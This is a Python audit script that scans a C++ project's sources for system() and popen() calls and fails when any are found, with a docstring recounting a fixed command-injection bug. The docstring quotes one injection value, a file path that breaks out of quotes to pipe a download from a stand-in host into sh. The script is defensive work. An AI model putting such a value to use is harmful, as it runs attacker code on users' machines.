"""Does anything hand a runtime string to a shell?

Deckboy opens files and links for the operator, and the things it opens come
out of the SHOW FILE -- a document people send each other. Both of those paths
used to build a command line by pasting the value inside double quotes and
calling std::system(). Double quotes do not disarm a shell: $, backtick and "
itself all still work, so a cue whose media path was

    /tmp/x";curl evil.example/x|sh;"

ran that the moment an operator picked "show in explorer" on it (fixed in
v0.99.313). Opening somebody else's show is meant to be safe.

The rule this enforces is simple and has no exceptions worth making: build an
argv VECTOR and spawn it. spawnProcess / spawnDetachedProcess / runCaptured all
take one, none of them goes near a shell, and there is then no quoting to get
right. A literal command with no runtime data in it is still refused -- the
next person to edit it will concatenate something in, and this check is
cheaper than noticing that.

    python tools/audit_shell_safety.py
"""
import io
import os
import re
import sys

ROOTS = (os.path.join('native', 'app'),
         os.path.join('native', 'core'),
         os.path.join('native', 'engine'),
         os.path.join('native', 'platform'),
         'native')

# Vendored code is not ours to restyle.
SKIP = (os.path.join('native', 'extras'),
        os.path.join('native', 'third_party'))

# The shell entry points. popen is included because it is the same hazard with
# a pipe attached.
CALLS = re.compile(r'\b(?:std::)?(?:system|popen|_popen|_wsystem)\s*\(')


def sources():
    seen = set()
    for root in ROOTS:
        if not os.path.isdir(root):
            continue
        for base, _dirs, files in os.walk(root):
            if any(base.startswith(s) for s in SKIP):
                continue
            for f in files:
                if f.endswith(('.cpp', '.hpp', '.ipp')):
                    p = os.path.join(base, f)
                    if p not in seen:
                        seen.add(p)
                        yield p


def main():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    os.chdir(root)
    hits = []
    for path in sorted(sources()):
        text = io.open(path, encoding='utf-8', errors='replace').read()
        for n, line in enumerate(text.split('\n'), start=1):
            stripped = line.strip()
            # Comments describing the hazard are the point of the comment.
            if stripped.startswith('//') or stripped.startswith('*'):
                continue
            if CALLS.search(line):
                hits.append((path, n, stripped[:96]))

    print('sources checked for a shell: %d' % len(list(sources())))
    print()
    print('[1] calls that hand a command line to a shell: %d' % len(hits))
    for path, n, line in hits:
        print('      %s:%d' % (path.replace(os.sep, '/'), n))
        print('        %s' % line)
    print()
    if hits:
        print('Use spawnProcess / spawnDetachedProcess / runCaptured with an argv')
        print('vector instead. They never build a command line.')
        print()
        print('FAIL')
        return 1
    print('clean')
    return 0


if __name__ == '__main__':
    sys.exit(main())
